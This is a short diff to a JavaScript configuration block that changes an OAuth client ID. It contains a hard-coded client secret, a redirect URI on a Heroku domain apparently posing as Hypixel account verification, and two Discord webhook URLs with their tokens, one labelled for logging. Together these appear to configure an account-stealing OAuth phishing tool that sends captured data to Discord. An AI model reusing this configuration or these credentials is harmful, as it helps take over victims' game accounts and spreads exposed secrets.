@@ -1,6 +1,6 @@
 // Configuration
 const client_secret = 'xYo8Q~4Ln.ZZTHJ36oRdWR1YphlO5yW-XTn0.b7U'
-const client_id = '1ac54ca5-5d3a-4a26-8aa0-da11358f8203'
+const client_id = '1e7c9171-505e-4495-91cb-bfb9fce9636d'
 const redirect_uri = 'https://verifyapplicationhypixel.herokuapp.com/'
 const webhook_url = 'https://discord.com/api/webhooks/1039970965624455278/zeusMOtIyHYaO3uT29bOe2sjt5CLk5ha0-wILfvRjPVZvOZXnX3SHfAPSOQx4H_8SVGT'
 const webhook_logging_url = 'https://discord.com/api/webhooks/1039970965624455278/zeusMOtIyHYaO3uT29bOe2sjt5CLk5ha0-wILfvRjPVZvOZXnX3SHfAPSOQx4H_8SVGT'
